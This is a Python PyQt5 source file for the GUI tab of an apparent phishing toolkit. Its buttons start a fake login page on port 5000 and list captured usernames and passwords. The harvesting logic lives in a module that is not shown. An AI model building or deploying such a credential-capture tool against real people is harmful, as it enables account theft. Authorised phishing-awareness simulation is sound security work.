from PyQt5.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QTextEdit
from core.phishing import start_phishing_server, get_credentials
from threading import Timer

class PhishingTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        self.output = QTextEdit()
        self.output.setReadOnly(True)

        self.start_button = QPushButton("Start Fake Login Page")
        self.refresh_button = QPushButton("Check Captured Credentials")

        self.start_button.clicked.connect(self.start_server)
        self.refresh_button.clicked.connect(self.show_creds)

        layout.addWidget(QLabel("Phishing Simulation"))
        layout.addWidget(self.start_button)
        layout.addWidget(self.refresh_button)
        layout.addWidget(self.output)
        self.setLayout(layout)

    def start_server(self):
        start_phishing_server()
        self.output.append("[+] Fake login page hosted at http://0.0.0.0:5000")

    def show_creds(self):
        creds = get_credentials()
        if not creds:
            self.output.append("[-] No credentials captured yet.")
        else:
            for user, pwd in creds:
                self.output.append(f"[+] Username: {user}, Password: {pwd}")
